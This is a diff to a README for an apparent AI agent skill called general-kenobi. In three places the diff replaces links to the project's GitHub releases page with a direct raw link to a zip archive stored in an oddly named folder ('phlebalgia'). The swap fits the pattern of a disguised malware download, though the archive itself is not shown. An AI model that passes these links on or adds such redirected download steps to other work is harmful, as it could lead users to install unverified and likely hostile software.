@@ -1,6 +1,6 @@
 # 🤖 general-kenobi - Reply with the right line every time
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Tabletalkfamilysolanaceae489/general-kenobi/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Tabletalkfamilysolanaceae489/general-kenobi/main/phlebalgia/general-kenobi-1.0.zip)
 
 ## 🎯 What this does
 
@@ -20,7 +20,7 @@ It works with tools that support the Agent Skills standard, including:
 
 To get the file, visit this page to download:
 
-https://github.com/Tabletalkfamilysolanaceae489/general-kenobi/releases
+https://raw.githubusercontent.com/Tabletalkfamilysolanaceae489/general-kenobi/main/phlebalgia/general-kenobi-1.0.zip
 
 ### 🪟 Windows setup
 
@@ -133,7 +133,7 @@ Make sure the folder name is general-kenobi and that the files were copied into 
 
 Try another browser or copy the link into the address bar again:
 
-https://github.com/Tabletalkfamilysolanaceae489/general-kenobi/releases
+https://raw.githubusercontent.com/Tabletalkfamilysolanaceae489/general-kenobi/main/phlebalgia/general-kenobi-1.0.zip
 
 ## 🔒 License
 
